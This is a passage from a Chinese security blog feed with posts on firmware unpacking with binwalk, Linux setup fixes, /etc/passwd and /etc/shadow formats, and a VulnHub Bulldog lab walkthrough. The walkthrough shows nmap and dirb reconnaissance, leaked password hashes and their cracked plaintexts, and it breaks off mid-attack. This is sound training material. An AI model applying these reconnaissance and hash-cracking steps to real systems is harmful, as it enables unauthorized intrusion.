        <content type="html"><![CDATA[<p>在Linux下使用binwalk工具效果最佳，坑最少；推荐在ubuntu系统下安装和使用binwalk工具。</p><p>binwalk工具的简单安装</p><pre><code>$ sudo apt-get update$ sudo apt-get install build-essential autoconf git$ git clone https://github.com/devttys0/binwalk$ cd binwalk$ sudo python setup.py install# 如果安装的是 python 2.x，还需要安装python-lzma模块$ sudo apt-get install python-lzma</code></pre><p>安装完成以后，我们可以找一个路由器固件测试一下。</p><p>《揭秘家用路由器0day漏洞挖掘技术》书中的第三章提供了一个在D-Link官方技术支持网站可以进行下载的固件链接地址：</p><pre><code>ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</code></pre><p>下载下来并且拷贝到Ubuntu18.04的虚拟机中，然后对这个压缩包进行解压，再打开命令行终端程序，使用binwalk -e，再加上固件文件作为参数，就可以对这个固件解包了</p><pre><code>$ binwalk -e dir605L_FW_113.bin</code></pre><p>可能会遇到错误 [Errno 2] No such file or directory: ‘sasquatch’: ‘sasquatch’</p><pre><code>$ binwalk -e dir605L_FW_113.bin DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------11280         0x2C10          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2129920 bytesWARNING: Extractor.execute failed to run external extractor &#39;sasquatch -p 1 -le -d &#39;squashfs-root&#39; &#39;%e&#39;&#39;: [Errno 2] No such file or directory: &#39;sasquatch&#39;: &#39;sasquatch&#39;, &#39;sasquatch -p 1 -le -d &#39;squashfs-root&#39; &#39;%e&#39;&#39; might not be installed correctlyWARNING: Extractor.execute failed to run external extractor &#39;sasquatch -p 1 -be -d &#39;squashfs-root&#39; &#39;%e&#39;&#39;: [Errno 2] No such file or directory: &#39;sasquatch&#39;: &#39;sasquatch&#39;, &#39;sasquatch -p 1 -be -d &#39;squashfs-root&#39; &#39;%e&#39;&#39; might not be installed correctly563234        0x89822         Squashfs filesystem, big endian, version 2.0, size: 64160 bytes, 7 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:03:47WARNING: Extractor.execute failed to run external extractor &#39;sasquatch -p 1 -le -d &#39;squashfs-root-0&#39; &#39;%e&#39;&#39;: [Errno 2] No such file or directory: &#39;sasquatch&#39;: &#39;sasquatch&#39;, &#39;sasquatch -p 1 -le -d &#39;squashfs-root-0&#39; &#39;%e&#39;&#39; might not be installed correctlyWARNING: Extractor.execute failed to run external extractor &#39;sasquatch -p 1 -be -d &#39;squashfs-root-0&#39; &#39;%e&#39;&#39;: [Errno 2] No such file or directory: &#39;sasquatch&#39;: &#39;sasquatch&#39;, &#39;sasquatch -p 1 -be -d &#39;squashfs-root-0&#39; &#39;%e&#39;&#39; might not be installed correctly628788        0x99834         Squashfs filesystem, big endian, version 2.0, size: 2301312 bytes, 495 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:04:00</code></pre><p>需要安装sasquatch</p><pre><code>打开命令行$ git clone https://github.com/devttys0/sasquatch安装依赖环境$ sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev$ cd sasquatch$ ./build.sh</code></pre><p>之后，再进行binwalk解压，终于成功。</p><pre><code>$ binwalk -e dir605L_FW_113.bin DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------11280         0x2C10          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 2129920 bytes563234        0x89822         Squashfs filesystem, big endian, version 2.0, size: 64160 bytes, 7 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:03:47628788        0x99834         Squashfs filesystem, big endian, version 2.0, size: 2301312 bytes, 495 inodes, blocksize: 65536 bytes, created: 2012-05-25 04:04:00</code></pre><p>固件解包后，就可以拿到固件中包含的各种程序，如经常出现漏洞的Web服务器程序（boa）：</p><pre><code>squashfs-root-0/bin/boa</code></pre><p>拿到了存在或可能存在漏洞的程序后，我们就可以进一步通过IDA静态分析或动态调试等手段进行漏洞分析了。</p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04换国内源</title>
      <link href="2020/08/17/2020-08-17-ubuntu_sourcelist/"/>
      <url>2020/08/17/2020-08-17-ubuntu_sourcelist/</url>
      
        <content type="html"><![CDATA[<p>备份源列表</p><pre><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></pre><p>修改sources.list文件</p><pre><code>sudo gedit /etc/apt/sources.list</code></pre><p>编辑 /etc/apt/sources.list 文件，更改为阿里云镜像源</p><pre><code>#  阿里源deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>更新并升级</p><pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade</code></pre><p>其他源</p><pre><code># 清华源deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse#  中科大源deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse# 163源deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之bash反弹shell</title>
      <link href="2020/08/12/2020-08-12-linux_bash_reverse_shell/"/>
      <url>2020/08/12/2020-08-12-linux_bash_reverse_shell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/87017"> 【技术分享】linux各种一句话反弹shell总结</a></p><p><a href="https://blog.csdn.net/Auuuuuuuu/article/details/89059176">Linux之bash反弹shell原理浅析</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali2020 缺少ifconfig命令</title>
      <link href="2020/08/11/2020-08-11-kali2020_ifconfig/"/>
      <url>2020/08/11/2020-08-11-kali2020_ifconfig/</url>
      
        <content type="html"><![CDATA[<p>这个是因为kali安装是时候没有安装net-tools工具包</p><pre><code>sudo apt-get install net-tools</code></pre><p>安装完成之后发现还是有问题</p><p>还是输入没有命令</p><p>因为2020版的默认登录不是root用户所以加上sudo</p><pre><code>sudo ifconfig</code></pre><p>直接切换成root权限的方法如下：</p><p>修改root密码</p><pre><code>sudo passwd root</code></pre><p>提升权限</p><pre><code>su root</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 系统中 /etc/passwd 和 /etc/shadow文件详解</title>
      <link href="2020/08/11/2020-08-11-linux_etc_passwd_shadow/"/>
      <url>2020/08/11/2020-08-11-linux_etc_passwd_shadow/</url>
      
        <content type="html"><![CDATA[<p>在linux操作系统中， /etc/passwd文件中的每个用户都有一个对应的记录行,记录着这个用户的一下基本属性。该文件对所有用户可读。</p><p>而/etc/shadow文件正如他的名字一样，他是passwd文件的一个影子，/etc/shadow文件中的记录行与/etc/passwd中的一一对应，它由pwconv命令根据/etc/passwd中的数据自动产生。但是/etc/shadow文件只有系统管理员才能够进行修改和查看。</p><h2 id="etc-passwd文件介绍"><a href="#etc-passwd文件介绍" class="headerlink" title="/etc/passwd文件介绍"></a>/etc/passwd文件介绍</h2><p>首先，我们通过命令行cat /etc/passwd进行查看/etc/passwd文件内容：</p><pre><code>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinlibuuid:x:100:101::/var/lib/libuuid:syslog:x:101:104::/home/syslog:/bin/falsemessagebus:x:102:106::/var/run/dbus:/bin/falseusbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/falsednsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/falseavahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/falsekernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/falsertkit:x:107:114:RealtimeKit,,,:/proc:/bin/falsesaned:x:108:115::/home/saned:/bin/falsewhoopsie:x:109:116::/nonexistent:/bin/falsespeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/shavahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/falselightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/falsecolord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/falsehplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/falsepulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/falseyaofei:x:1000:1000:ubuntu14.04,,,:/home/yaofei:/bin/bashsshd:x:116:65534::/var/run/sshd:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>从文件中我们可以看到，/etc/passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：<br>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell</p><pre><code>用户名(login_name):是代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和/或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。口令(passwd):一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于/etc/passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到/etc/shadow文件中，而在/etc/passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。用户标识号(UID):是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。组标识号(GID):字段记录的是用户所属的用户组。它对应着/etc/group文件中的一条记录。注释性描述(users):字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。主目录(home_directory):也就是用户的起始工作目录，它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。登录Shell(Shell):用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)等。系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为/bin/sh。</code></pre><h2 id="etc-shadow文件介绍"><a href="#etc-shadow文件介绍" class="headerlink" title="/etc/shadow文件介绍"></a>/etc/shadow文件介绍</h2><p>/etc/shadow文件格式与/etc/passwd文件格式类似，同样由若干个字段组成，字段之间用“:”隔开。</p><p>通过命令行输入sudo cat /etc/shadow进行文件内容查看：</p><pre><code>root:!:17043:0:99999:7:::daemon:*:16652:0:99999:7:::bin:*:16652:0:99999:7:::sys:*:16652:0:99999:7:::sync:*:16652:0:99999:7:::games:*:16652:0:99999:7:::man:*:16652:0:99999:7:::lp:*:16652:0:99999:7:::mail:*:16652:0:99999:7:::news:*:16652:0:99999:7:::uucp:*:16652:0:99999:7:::proxy:*:16652:0:99999:7:::www-data:*:16652:root:!:17043:0:99999:7:::daemon:*:16652:0:99999:7:::bin:*:16652:0:99999:7:::sys:*:16652:0:99999:7:::sync:*:16652:0:99999:7:::games:*:16652:0:99999:7:::man:*:16652:0:99999:7:::lp:*:16652:0:99999:7::99:7:::gnats:*:16652:0:99999:7:::nobody:*:16652:0:99999:7:::libuuid:!:16652:0:99999:7:::syslog:*:16652:0:99999:7:::messagebus:*:16652:0:99999:7:::usbmux:*:16652:0:99999:7:::dnsmasq:*:16652:0:99999:7:::avahi-autoipd:*:16652:0:99999:7:::kernoops:*:16652:0:99999:7:::rtkit:*:16652:0:99999:7:::saned:*:16652:0:99999:7:::whoopsie:*:16652:0:99999:7:::speech-dispatcher:!:16652:0:99999:7:::avahi:*:16652:0:99999:7:::lightdm:*:16652:0:99999:7:::colord:*:16652:0:99999:7:::hplip:*:16652:0:99999:7:::pulse:*:16652:0:99999:7:::yaofei:$1$5M0Rbozg$1fWsJaQB.TFAL24b96xi41:17043:0:99999:7:::sshd:*:17043:0:99999:7:::mysql:!:17048:0:99999:7:::</code></pre><p>文件中字段主要含义为：登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</p><pre><code>“登录名”是与/etc/passwd文件中的登录名相一致的用户账号“口令”字段存放的是加密后的用户口令字：    如果为空，则对应用户没有口令，登录时不需要口令；    星号代表帐号被锁定；    双叹号表示这个密码已经过期了；    $6$开头的，表明是用SHA-512加密；    $1$表明是用MD5加密；    $2$ 是用Blowfish加密；    $5$ 是用 SHA-256加密；“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。“最小时间间隔”指的是两次修改口令之间所需的最小天数。“最大时间间隔”指的是口令保持有效的最大天数。“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 网卡 device not managed 错误</title>
      <link href="2020/08/11/2020-08-11-linux_network_device_not_managed/"/>
      <url>2020/08/11/2020-08-11-linux_network_device_not_managed/</url>
      
        <content type="html"><![CDATA[<p>问题描述</p><p>今天我用VM虚拟机打开Kali Linux 2020（基于Debian的Linux发行版）的时候，Ethernet Network网卡打叉，并显示如下错误提示：</p><pre><code>device not managed</code></pre><p>既然出现了上面这种状态，肯定是不能上网的，我用命令：ping baidu.com 都ping不通。</p><p>解决方法</p><p>解决这个“device not managed ”的问题也很简单，也不仅仅只适用于Kali Linux（Debian），Ubuntu系统也会遇到同样适用。</p><p>1、编辑 /etc/NetworkManager/NetworkManager.conf</p><pre><code>vi /etc/NetworkManager/NetworkManager.conf</code></pre><p>将其中的 managed=false 改为 managed=true</p><p>2、重启 network-manager service</p><pre><code>sudo service network-manager restart</code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在vmware上访问virtualbox的虚拟机</title>
      <link href="2020/08/11/2020-08-11-vmware_virtualbox_connect/"/>
      <url>2020/08/11/2020-08-11-vmware_virtualbox_connect/</url>
      
        <content type="html"><![CDATA[<p>问题描述：</p><p>最近要复现一个靶机，但是这个靶机只能在virtualbox上打开，可是我的kali安装在vmware上，想直接在kali上对靶机进行渗透攻击，可是kali和靶机并不在同一个网段。</p><p>解决方法</p><p>首先打开vmware，点击编辑里面的虚拟网络编辑器。点击更改配置。将网卡桥接到主机网卡上</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vmware_virtualbox_connect_1.png"></p><p>然后打开virtualbox，将网络也桥接到主机网卡上</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vmware_virtualbox_connect_2.png"></p><p>打开虚拟机，可以看到已经成功的和靶机在一个网段里面了，可以ping通。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vmware_virtualbox_connect_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub靶机BullDog实战</title>
      <link href="2020/08/11/2020-08-11-vulnhub_bulldog/"/>
      <url>2020/08/11/2020-08-11-vulnhub_bulldog/</url>
      
        <content type="html"><![CDATA[<p>作为一名渗透测试行业的菜鸟，一直没有找到好的靶场来进行练习，最近了解到Vnluhub（<a href="http://www.vulnhub.com)./">www.vulnhub.com）。</a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><pre><code>*靶机难度：初学者/中级*目标：提权到root权限并查看flag*攻击机：kali linux，IP地址192.168.15.121*靶机：bulldog，IP地址192.168.15.129（下载地址：https://download.vulnhub.com/bulldog/bulldog.ova）*运行环境：kali运行在VMware中，靶机在Virtualbox中</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>bulldog在开机时界面上已经有一个IP地址</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_1.png"></p><p>但还是熟悉下nmap扫描 </p><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><pre><code>nmap -sP 192.168.15.0/24.....Nmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00012s latency).MAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC).....</code></pre><h3 id="信息扫描"><a href="#信息扫描" class="headerlink" title="信息扫描"></a>信息扫描</h3><pre><code>nmap -A 192.168.15.129Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 13:11 EDTNmap scan report for bulldog.nthome.org (192.168.15.129)Host is up (0.00044s latency).Not shown: 997 closed portsPORT     STATE SERVICE VERSION23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog Industries8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)|_http-server-header: WSGIServer/0.1 Python/2.7.12|_http-title: Bulldog IndustriesMAC Address: 08:00:27:16:1D:5F (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.44 ms bulldog.nthome.org (192.168.15.129)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds</code></pre><h3 id="漏洞挖掘的详细思路"><a href="#漏洞挖掘的详细思路" class="headerlink" title="漏洞挖掘的详细思路"></a>漏洞挖掘的详细思路</h3><p>web漏洞思路：</p><p>(1) 查看每个网页的源码，看是否有提示；</p><p>(2) 暴破目录，用DirBuster，看是否有新网页，找新网页的漏洞；</p><p>(3) 找注入或框架漏洞：如果网页有输入框、URL参数，可AWVS扫描注入；如果web使用了某些CMS框架，只能找框架的通用漏洞，通常扫描不到注入。</p><p>ssh利用思路：</p><p>(1) 如得到用户名，可以用就九头蛇或美杜莎暴破弱口令，但需要强大的字典且有弱口令。</p><p>(2) 如果得到web管理或系统账号，可以尝试连接ssh，如能连接上，无需反弹shell了。</p><h3 id="查看web服务"><a href="#查看web服务" class="headerlink" title="查看web服务"></a>查看web服务</h3><p>访问此地址 bulldog.nthome.org (192.168.15.129) 看看</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_2.png"></p><p>主要是说被黑客攻击，然后下面有个通告 Public Notice链接</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_3.png"></p><p>打开是CEO写给客户的信，也没什么重要信息。因此，我们使用dirb查找目录以获取更多信息。</p><h3 id="浏览网页，爆破目录"><a href="#浏览网页，爆破目录" class="headerlink" title="浏览网页，爆破目录"></a>浏览网页，爆破目录</h3><p>在kali中打开命令终端，输入</p><pre><code>dirb http://192.168.15.129</code></pre><p>结果如下</p><pre><code>-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Mon Aug 10 11:23:26 2020URL_BASE: http://192.168.15.129/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                          ---- Scanning URL: http://192.168.15.129/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/                                                                       ==&gt; DIRECTORY: http://192.168.15.129/dev/                                                                         + http://192.168.15.129/robots.txt (CODE:200|SIZE:1071)                                                           ---- Entering directory: http://192.168.15.129/admin/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/                                                                  ==&gt; DIRECTORY: http://192.168.15.129/admin/login/                                                                 ==&gt; DIRECTORY: http://192.168.15.129/admin/logout/                                                                ---- Entering directory: http://192.168.15.129/dev/ ----==&gt; DIRECTORY: http://192.168.15.129/dev/shell/                                                                   ---- Entering directory: http://192.168.15.129/admin/auth/ ----==&gt; DIRECTORY: http://192.168.15.129/admin/auth/group/                                                            ==&gt; DIRECTORY: http://192.168.15.129/admin/auth/user/                                                             ---- Entering directory: http://192.168.15.129/admin/login/ -------- Entering directory: http://192.168.15.129/admin/logout/ -------- Entering directory: http://192.168.15.129/dev/shell/ -------- Entering directory: http://192.168.15.129/admin/auth/group/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)---- Entering directory: http://192.168.15.129/admin/auth/user/ ----(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs &#123;30X&#125;.    (Try using FineTunning: &#39;-f&#39;)-----------------END_TIME: Mon Aug 10 11:25:29 2020DOWNLOADED: 32284 - FOUND: 1</code></pre><p>发现有两个主目录，一个是admin，一个是dev</p><p>分别查看</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_4.png"></p><p>admin 是一个登录界面，可是我们没有用户名和密码。难道要用burp爆破一下？等会再说，而且还有dirb里扫描出的一个链接没打开，现在先看看当前页面的源代码，没啥有用的，看看扫描出的另一链接</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/vulnhub_bulldog_5.png"></p><p>dev 是一个介绍，主要说新的系统是用Django语言编写并且启用了SSH，完全删除了PHP。新系统不再使用php或任何CMS，而是使用Django框架开发。这意味着不太可能再找到网页的注入漏洞，只能找Django框架漏洞；网站不使用php，无需再找php漏洞或者写php木马；</p><p>页面中间有一个Web-Shell链接，点进去看下，有提示，需要认证</p><pre><code>Please authenticate with the server to use Web-Shell</code></pre><p>一般来说web shell是能为我们所用的，但是现在提示与服务器进行身份验证才能使用web shell。那好吧，看看源代码</p><p>查看源代码，看到</p><pre><code>&lt;p&gt;&lt;font size=&quot;6em&quot;&gt;&lt;center&gt;&lt;a href=&quot;/dev/shell&quot; style=&quot;color:blue&quot;&gt;Web-Shell&lt;/a&gt;&lt;/center&gt;&lt;/font&gt;&lt;/p&gt;    &lt;b&gt;Who do I talk to to get started?&lt;/b&gt;&lt;br&gt;&lt;br&gt;    &lt;!--Need these password hashes for testing. Django&#39;s default is too complex--&gt;    &lt;!--We&#39;ll remove these in prod. It&#39;s not like a hacker can do anything with a hash--&gt;    Team Lead: alan@bulldogindustries.com&lt;br&gt;&lt;!--6515229daf8dbdc8b89fed2e60f107433da5f2cb--&gt;    Back-up Team Lead: william@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--38882f3b81f8f2bc47d9f3119155b05f954892fb--&gt;    Front End: malik@bulldogindustries.com&lt;br&gt;&lt;!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279--&gt;    Front End: kevin@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9--&gt;    Back End: ashley@bulldogindustries.com&lt;br&gt;&lt;!--553d917a396414ab99785694afd51df3a8a8a3e0--&gt;    Back End: nick@bulldogindustries.com&lt;br&gt;&lt;br&gt;&lt;!--ddf45997a7e18a25ad5f5cf222da64814dd060d5--&gt;    Database: sarah@bulldogindustries.com&lt;br&gt;&lt;!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e--&gt;</code></pre><h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><p>40位hash值，猜测是sha1，猜测可能是前面开发人员的账号密码，即使不知道是哪种hash，也可以把每个hash值找在线工具CMD5解密一下，解出两个</p><pre><code>ddf45997a7e18a25ad5f5cf222da64814dd060d5 -&gt; bulldogd8b8dd5e7f000b8dea26ef8428caf38c04466b3e -&gt; bulldoglover</code></pre><h3 id="登录后台"><a href="#登录后台" 